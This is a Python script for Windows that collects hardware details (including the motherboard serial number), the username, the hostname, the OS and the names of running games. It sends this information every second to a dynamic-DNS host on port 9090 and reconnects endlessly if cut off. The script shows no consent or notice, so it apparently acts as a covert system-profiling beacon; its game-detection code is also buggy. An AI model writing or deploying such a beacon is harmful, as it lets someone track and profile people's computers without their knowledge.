import socket, os, platform, time, socket, subprocess, wget

def GetHardwareMotherboard():
    import win32com
    motherboard_details = []
    strComputer = "."
    objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
    objSWbemServices = objWMIService.ConnectServer(strComputer,"root\cimv2")
    colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_BaseBoard")
    for objItem in colItems:
	    main_board = {
		    'name': objItem.Name,
		    'description': objItem.Description,
		    'manufacturer': objItem.Manufacturer,
		    'model': objItem.Model,
		    'product': objItem.Product,
		    'serialNumber': objItem.SerialNumber,
		    'version': objItem.Version
	    }
	    motherboard_details.append(main_board)
    mass = str(motherboard_details[0]).split()
    a = len(mass)
    i = 0
    while(i<a):
        if(mass[i] == "'manufacturer':"):
            b = mass[i+1][1:][:-2]
        if(mass[i] == "'product':"):
            c = ""
            while(mass[i+1] != "'serialNumber':"):
                c = c + mass[i+1] + " "
                i += 1
        if(mass[i] == "'serialNumber':"):
            d = mass[i+1][1:][:-2]
        i += 1
    motherboard = b + " " + c[1:][:-3] + " " + d
    i = 0
    return(motherboard)


def GetHardware():
    import wmi
    os_info = wmi.WMI().Win32_OperatingSystem()[0]
    cpu_info = wmi.WMI().Win32_Processor()[0].Name
    gpu_info = wmi.WMI().Win32_VideoController()[0].Name
    ram_info = float(os_info.TotalVisibleMemorySize) / 1048576
    ram = str(round(float('{0}'.format(ram_info)))) + " GB"
    mb = str(GetHardwareMotherboard())
    return(cpu_info, gpu_info, ram, mb)

def GetMonitorResolution():
    from win32api import GetSystemMetrics
    width = GetSystemMetrics(0)
    height = GetSystemMetrics(1)
    return(str(width) + "x" + str(height))

def process_exists(process_name):
    n = 0
    prog = []
    for line in subprocess.check_output("tasklist", shell=True).splitlines():
        prog.append(str(line)[2:].split())
    for task in prog:
        if task[0] == process_name:
            n=n+1
    if n>0:
        print(process_name, True)
        return True
    else:
        return False

Hardware = GetHardware()

while(True):
    try:
        socket.setdefaulttimeout(1)
        s = socket.socket()
        s.connect(('reymadness.ddns.net', 9090))
        print('Connected!')
        break
    except:
        print('Can not')
        time.sleep(1)

while(True):
    info = ""
    Username = "{} [{}]".format(os.environ.get('USERNAME'), socket.gethostname())
    OS = platform.system() + " " + platform.release()
    IP = socket.gethostbyname(socket.gethostname())
    info = "{}\n{}\n".format(Username, OS)
    for comp in Hardware:
        info += "{}\n".format(comp)
    games = ""
    #games
    if(process_exists('dota2.exe') == True):
        if(games == ""):
            game = "Dota 2"
            games += game
        else:
            games += ", {}".format(game)
    if(process_exists('csgo.exe') == True):
        if(games == ""):
            game = "CS:GO"
            games += game
        else:
            games += ", {}".format(game)
    if(process_exists('javaw.exe') == True):
        if(games == ""):
            game = "Minecraft"
            games += game
        else:
            games += ", {}".format(game)
    if(process_exists('colonyclient.exe') == True):
        if(games == ""):
            game = "Colony Survival"
            games += game
        else:
            games += ", {}".format(game)

    info += games + "\n"
    try:
        s.send(info.encode('UTF-8'))
    except:
        while(True):
            try:
                socket.setdefaulttimeout(1)
                s = socket.socket()
                s.connect(('reymadness.ddns.net', 9090))
                print('Connected!')
                break
            except:
                print('Can not')
                time.sleep(1)
    time.sleep(1)
